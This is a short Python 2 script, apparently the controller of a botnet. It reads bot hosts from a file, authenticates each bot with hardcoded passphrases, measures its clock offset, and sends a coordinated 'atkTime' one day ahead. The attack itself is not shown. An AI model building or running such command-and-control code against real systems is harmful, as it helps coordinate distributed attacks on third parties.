#!/usr/bin/env python

import socket
import time
import Util

class Master:

   MASTER_PASSPHRASE = 'gits#9sac'
   BOT_PASSPHRASE    = 'standalone'

   def __init__(self):
      print 'Initializing Master...'

      # list containing host names, ports and delta time for the bots
      self.bots = []

      self.readBotsFile()
      self.outputBots()

      self.connectToBots()

   def readBotsFile(self):
      print 'Reading Bots file...'

      with open("bots_list.txt") as botsFile:
         for line in botsFile:
            host, sep, port = line.partition(":")
            self.bots.append([host.strip(), int(port.strip()), int(0)])

   def outputBots(self):
      print 'Current Bots:'
      print 'host:port time'
      
      for i, bot in enumerate(self.bots):
         print "%s:%d (%d)" % (bot[0], bot[1], bot[2])

   def connectToBots(self):
      for i, bot in enumerate(self.bots):
         print "Connecting to %s:%d" % (bot[0], bot[1])
         botSocket = socket.socket()
         botSocket.connect((bot[0], bot[1]))
         # botSocket.connect((socket.gethostname(), 21800))

         # second master passphrase
         Util.send(botSocket, self.MASTER_PASSPHRASE)

         # receive client's passphrase
         recvdPassphrase = Util.recieve(botSocket)

         if recvdPassphrase != self.BOT_PASSPHRASE:
            print 'Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' compromised!'
            botSocket.close()
            continue

         Util.send(botSocket, 'send me time')

         # receive bot time
         botTime = Util.recieve(botSocket)
         print 'Received botTime'


         print 'my current time: ' + str(int(time.time() * 1000))
         print 'botTime: ' + botTime.strip()
         print long(botTime.strip())

         self.bots[i][2] = int(time.time() * 1000) - int(botTime)

         atkTime = int(time.time() * 1000) + 86400000
         Util.send(botSocket, str(int(self.bots[i][2] + atkTime)))

         botSocket.close()

if __name__ == '__main__':
   master = Master()
